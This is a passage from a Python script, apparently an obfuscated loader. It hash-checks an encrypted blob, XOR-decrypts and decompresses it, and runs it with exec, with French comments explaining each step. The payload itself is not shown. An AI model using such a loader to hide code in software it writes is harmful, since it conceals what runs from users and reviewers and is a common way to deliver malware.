_c_OphAyRRKjeWo + _cj9RlIM__XmyTS + _cn7Hh2jbCdcJ79 + _cdgXnaYWghp6MO + _caeLjZr63ls5Da + _cpSPxTYUqmq1zG + _cqWh9RCflYeHPr + _cw8JEV9Dan5bD7 + _cykKsnjQKDhrWk + _cqCFWDri8FVcd4 + _ca5oi5UbnS3epU + _cxcgGUJvreueST + _crjX7qRpPq3BXt + _cxM4MVAopAnyIh + _c_50dzlmOiM4_a + _c_WG5PlnZaqOXE + _cpkiJ57CWUIHa4 + _cuSw9yXD5n1IaP + _cvFwKQUyaNS2Ub + _ck1BRWQEyl10ME + _cvWNmZG6PnNx4q + _cklcnzDp7BC8Fo + _ct9W13uKvQ9oTk + _cqNjAdVaBgJCOm + _cw4pcU0tfZspln + _c_XAAvIkWMqnS5 + _cjTOc7n9tx35CE + _ceuwZIlv7SnTy_ + _cpQGdCMe4tMHUk + _c_JyrLMocmQmVr + _csFjE1O_bwtOyL + _ch1BVQJ212KHfF + _coro8lGXqIliPb + _coiQKGnML7Io1w + _cjv505lSXA266l + _czv1DWmFaEXaEG + _cggFiZuRNcWVR6 + _chWEXdCyZm4f1s + _cziIqtuAJ2DbkM + _cobB8p3UCD4Qu4 + _crKOpDYN_fBJkZ + _c_nLbI3nbtbXQl + _cks5hJBbQMCuAd + _cer57k2FbWvZXM + _caCZ4hmCoFMW_c + _cs1GWeufEqxc3K + _cgxN_iX7eeUUeX + _cdqVKi4axIOBoa + _cs0n6M0Ktg3POH + _cmTKqWGV5ddD4R + _cfiNT71MWOTXV9 + _cpIugqKiGKwldj + _cyohQ4P6XA7GA5 + _cmxP9KY3Pd5Vvy + _cgR4DhpysYfIib + _cvG5ffSklPdfZx + _c_rdBPAx6VFX8l + _cxckwRDBADUwJ9 + _cugkMo3y4V6exS + _cmQEbi6p8zPZTT + _ctSbobHcnlgIoP + _ciGSJDh76deplL + _cgb3pJUCninhHm + _cj67Uz4il7Xwif + _ckp8zrKNfuwNJ7 + _cpd0HT1sYWNyCR + _ctcwcz0nq02nb8 + _cw5HfJhxQhQZgk + _cp9SKE3FkdbC99 + _c_lSW0ltJTBlCH + _ceLYcaO6tTCy08 + _caVQAjJwnR7wKX + _cvYqn6Ny40W5xk + _ctUOPqTBeqy2NY + _cymZGPrrXpEiB3 + _cnxqucD27C_zIL + _cadh1aWsyD0X6A + _cuVAnuX1Jaf2rS + _cxwInQOt2wQHEk + _cojaMBIGx0l6jY + _czUxbQ7eueK3qk + _cwbE4xHF4gdmAB + _cdR7gs1O8TVHzN + _cwfNKM2lzi9aCL + _ckRApkvSGYTvIy + _cvmMZolq6HB0cC + _cfv7DNZT5pFTBU + _ct9OR4Yv5iIa5Z + _cf4g6PqTcAO8WE + _cqM9HimSDnnxpX + _cwtfd2dJKM1kOw + _ceoTSFf1zGnv7H + _ci3smVLlTUB53l + _ccd4qN6X66XJ7n + _ccikkv5TnKHPej + _cbAEvFf1EPQSYe + _cjLdzcZTsteB9Y + _coWdiaKwIzmsaL + _ckm9bsMCWcxAUb + _crKQCq7UANeQWO)
if __import__('hashlib').sha256(_piRc0n3q53dHdw).hexdigest() != 'cb7440dec3454e9e4575c211094e6adf952aaa1dc934d763709cd07e2b60c8c4':
    __import__('sys').exit(1)
_xah1Vmw0jYC3RA = bytes([118, 134, 49, 15, 216, 82, 32, 118, 167, 36, 95, 149, 244, 100, 251, 51, 244, 53, 49, 73, 48])
_fkwMhlQiQZ_YMh2 = bytes([191, 31, 87, 57, 23, 5, 237, 144, 232, 201, 74, 30, 26, 195, 154, 106, 233, 123, 196, 81, 41])

def _fxpd4fw4eNL80va(_bw7r2e9c9Cw0r3, _kh49vaPOEStnZb):
    return bytes(_bw7r2e9c9Cw0r3[_inQNYyhB4ghRRs] ^ _kh49vaPOEStnZb[_inQNYyhB4ghRRs % len(_kh49vaPOEStnZb)] for _inQNYyhB4ghRRs in range(len(_bw7r2e9c9Cw0r3)))

def _fditMHBlp1ziMii(_thd8pBbTXtF7fU):
    import zlib
    return zlib.decompress(_thd8pBbTXtF7fU) # Un seul niveau de zlib ici pour simplifier

def _femY7lF8wQhC74A():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xciIbC5VecynBi = _fxpd4fw4eNL80va(_piRc0n3q53dHdw, _xah1Vmw0jYC3RA)
    # 2. Décompression Zlib
    _dm0iH2HzZ39SGQ = _fditMHBlp1ziMii(_xciIbC5VecynBi)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dm0iH2HzZ39SGQ.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nqbCEuL9sz13L0 = _main.__dict__
    _nqbCEuL9sz13L0.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nqbCEuL9sz13L0)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_femY7lF8wQhC74A()
try:
    del _fxpd4fw4eNL80va, _fditMHBlp1ziMii, _femY7lF8wQhC74A
    del _piRc0n3q53dHdw, _xah1Vmw0jYC3RA, _fkwMhlQiQZ_YMh2
except:
    pass
